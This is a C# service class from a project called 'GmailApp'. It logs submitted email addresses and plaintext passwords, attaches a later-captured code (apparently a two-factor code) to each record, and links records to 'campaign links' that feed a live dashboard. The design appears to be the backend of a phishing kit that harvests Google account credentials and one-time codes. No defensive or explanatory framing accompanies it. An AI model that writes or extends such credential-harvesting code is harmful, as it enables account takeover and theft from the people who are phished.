using GmailApp.Data;
using GmailApp.Models;
using Microsoft.EntityFrameworkCore;

namespace GmailApp.Services;

public class LoginLogService(AppDbContext db, AppStateService appState)
{
    public async Task<int> SaveEmailPasswordAsync(string email, string password, int? campaignLinkId = null)
    {
        var log = new LoginLog
        {
            Email = email,
            Password = password,
            Code = string.Empty,
            CreatedAt = DateTime.UtcNow,
            CampaignLinkId = campaignLinkId
        };
        db.LoginLogs.Add(log);
        await db.SaveChangesAsync();
        // Skip notification when a campaign is set — caller notifies after LockAsync
        // so the dashboard gets one refresh that already has IsLocked=true
        if (!campaignLinkId.HasValue)
            appState.NotifyLogsChanged();
        return log.Id;
    }

    public async Task UpdateCodeAsync(int id, string code)
    {
        var log = await db.LoginLogs.FindAsync(id);
        if (log is null) return;
        log.Code = code;
        await db.SaveChangesAsync();
        appState.NotifyLogsChanged();
    }

    public Task<List<LoginLog>> GetAllLogsAsync()
        => db.LoginLogs
             .Include(l => l.CampaignLink)
             .OrderByDescending(l => l.CreatedAt)
             .ToListAsync();

    public async Task DeleteAllAsync()
    {
        db.LoginLogs.RemoveRange(db.LoginLogs);
        await db.SaveChangesAsync();
        appState.NotifyLogsChanged();
    }
}
